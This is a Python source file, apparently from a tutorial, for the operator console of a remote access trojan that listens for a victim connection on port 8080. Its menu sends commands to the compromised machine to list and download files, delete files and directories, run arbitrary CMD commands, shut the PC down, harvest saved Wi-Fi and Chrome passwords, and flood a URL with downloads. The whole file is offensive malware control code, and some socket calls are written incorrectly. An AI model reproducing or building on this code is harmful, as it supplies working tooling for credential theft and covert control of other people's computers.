# https://www.youtube.com/watch?v=-goH6bhyxmA&feature=youtube_video_deck
import socket

s = socket.socket()
host = socket.gethostname()
port = 8080
s.bind((host, port))
print()
print("Server is currently running @", host)
print("Waiting for incoming connections")
s.listen(1)

conn, addr = s.accept()
print(addr, "Has connected")
print()

while True:

    print("1: View cwd\n"
          "2: View custom Dir\n"
          "3: Download File \n"
          "4: Delete File \n"
          "5: Delete Dir  \n"
          "6: Create File \n"
          "7: Return ipconfig (TODO...) \n"
          "8: Execute custom CMD command \n"
          "9: Shut it down -MC Hammer \n"
          "10: Get wifiPassword list  \n"
          "11: Get Chrome passwords  \n"
          "12: Spam download URL  \n"
          )
    print()
    command = input(str("command >> "))

    if command == "1":
        # Print Current Working Directory (CWD) 
        conn.send(command.encode())  # send 1
        files = conn.recv()  # get response
        files = files.decode()  # decode response
        print("Command output:", files)

    elif command == "2":
        # View custom directory
        conn.send(command.encode())
        userInput = input(str("Custom Dir: "))
        conn.send(userInput.encode())
        files = conn.recv().decode()
        print("Custom dir: ", files)

    elif command == "3":
        # Download a file 
        conn.send(command.encode())
        filePath = input(str(" please enter the files path: "))
        conn.send(filePath.encode())
        file = conn.recv()
        fileName = input(str("please enter name of file with extension: "))
        newFile = open(fileName, "wb")
        newFile.write(file)
        newFile.close()
        print("Downloaded and saved")

    elif command == "4":
        # Delete file
        conn.send(command.encode())
        conn.send(input(str("Enter path and name of file to delete: ")).encode())
        result = conn.recv().decode()
        print(result)

    elif command == "5":
        # Delete dir
        conn.send(command.encode())
        conn.send(input(str("Enter path of Dir to delete: ")).encode())
        result = conn.recv().decode()
        print(result)

    elif command == "6":
        # Create file
        conn.send(command.encode())
        conn.send(input(str("Enter path and new of the file to create: ")).encode())
        conn.send(input(str("Enter data to write: ")).encode())
        result = conn.recv().decode()
        print(result)



    elif command == "7":
        # Get ipconfig
        conn.send(command.encode())
        result = conn.recv().decode()  # TODO .recv withing pram, as per the docs, its unlimited be defualt
        print(result)

    elif command == "8":
        # Run command in CMD (non-admin)
        conn.send(command.encode())
        print("suggested: taskkill /IM notepad.exe")
        userInput = input(str("Command to run in CMD?: "))
        conn.send(userInput.encode())

        data = conn.recv()
        data.decode()
        print("responce: ", data)

    elif command == "9":
        # Shutdown target PC
        conn.send(command.encode())
        data = conn.recv()
        data.decode()
        print("responce: ", data)

    elif command == "10":
        # Get wifi password list
        conn.send(command.encode())
        response = conn.recv().decode()
        print("wifi passwords: ", response)

    elif command == "11":
        # Get Chrome passwords list
        conn.send(command.encode())
        response = conn.recv().decode()
        print("Passwords: ", response)

    elif command == "12":
        # Bandwidth Hog
        print("This might take forever")
        conn.send(command.encode())
        userInput = input(str("which URL to spam download?: "))
        conn.send(userInput.encode())
        response = conn.recv().decode()
        print("Status: ", response)

    else:
        print("Invalid Command")

    print("")
